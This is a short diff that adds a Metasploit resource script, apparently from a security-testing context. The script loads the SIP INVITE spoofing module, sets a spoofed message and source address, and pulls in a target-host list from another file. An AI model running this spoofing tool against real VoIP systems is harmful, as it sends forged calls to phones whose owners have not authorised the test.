@@ -1,0 +1,4 @@
+use auxiliary/voip/sip_invite_spoof
+set MSG SecureWorks Says Hi
+set SRCADDR 127.0.0.1
+resource stub_voip_rhosts.rb
